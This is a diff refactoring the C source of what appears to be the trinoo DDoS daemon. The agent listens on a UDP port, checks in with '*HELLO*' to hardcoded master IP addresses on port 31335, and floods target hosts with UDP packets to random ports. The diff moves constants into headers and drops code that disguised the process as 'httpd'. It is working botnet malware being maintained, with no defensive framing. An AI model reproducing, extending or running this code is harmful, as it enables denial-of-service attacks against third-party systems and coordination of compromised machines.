@@ -16,40 +16,17 @@
 #include <netdb.h>
 #include <time.h>
 
-/* ----------------- strfix.h ----------------- */
-#ifdef __GNUC__
-#define strcpy(dst, src) \
-({ \
-        char *_out = (dst); \
-        if (sizeof(dst) <= sizeof(char *)) \
-                _out = strcpy(_out, (src)); \
-        else { \
-                *_out = 0; \
-                _out = strncat(_out, (src), sizeof(dst) - 1); \
-        } \
-        _out; \
-})
-#define strcat(dst, src) \
-({ \
-        char *_out = (dst); \
-        if (sizeof(dst) <= sizeof(char *)) \
-                _out = strcat(_out, (src)); \
-        else { \
-                size_t _size = sizeof(dst) - strlen(_out) - 1; \
-                if (_size > 0) _out = strncat(_out, (src), _size); \
-        } \
-        _out; \
-})
-#endif
-/* ----------------- END of strfix.h  ----------------- */
+#include "../strfix.h"
+#include "../trinoo.h"
 
-/* #define PROCNAME "httpd" */
 char *master[] = {
 	"129.237.122.40",
 	"207.228.116.19",
 	"209.74.175.130",
 	NULL
 };
+
+#define rand_port() (htons(rand() % 65534))
 
 #define DEFSIZE 1000
 
@@ -66,12 +43,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 	char arg1[4], *arg2, pass[10], *temp, *unf;
 	void *buf2;
 	int start, end, stop = 0;
-#ifdef PROCNAME
-	int bewm;
-	for (bewm = argc - 1; bewm >= 0; bewm--)
-		memset(argv[bewm], 0, strlen(argv[bewm]));
-	strcpy(argv[0], PROCNAME);
-#endif
+
 	buf2 = (void *)malloc(DEFSIZE);
 
 	if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
@@ -81,7 +53,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 
 	sa.sin_family = AF_INET;
 	sa.sin_addr.s_addr = INADDR_ANY;
-	sa.sin_port = htons(27444);
+	sa.sin_port = htons(CLIENT_PORT);
 	to.sin_family = AF_INET;
 
 	if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
@@ -97,8 +69,8 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 	if (foke == -1)
 		exit(-1);
 	while (1) {
-		bzero(arg1, 4);
-		bzero(buf, 1024);
+		bzero(arg1, sizeof(arg1));
+		bzero(buf, sizeof(buf));
 		fromlen = sizeof(from);
 		if ((numread =
 		     recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from,
@@ -118,9 +90,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 					stop = 0;
 					if ((sock2 = getsock()) != -1)
 						while (!stop) {
-							to.sin_port =
-							    htons(rand() %
-								  65534);
+							to.sin_port = rand_port();
 							sendto(sock2, buf2,
 							       sizeof(buf2), 0,
 							       (struct sockaddr
@@ -171,10 +141,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 								    s_addr =
 								    inet_addr
 								    (temp);
-								to.sin_port =
-								    htons(rand()
-									  %
-									  65534);
+								to.sin_port = rand_port();
 								if (!stop)
 									sendto
 									    (sock2,
@@ -225,7 +192,7 @@ int hello()
 {
 	int i = 0;
 	while (master[i] != NULL) {
-		sendudp(master[i], "*HELLO*", 31335);
+		sendudp(master[i], "*HELLO*", MASTER_PORT);
 		i++;
 	}
 	return 0;
@@ -233,9 +200,5 @@ int hello()
 
 int getsock()
 {
-	int i;
-	if ((i = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1)
-		return i;
-	else
-		return -1;
+	return socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 }
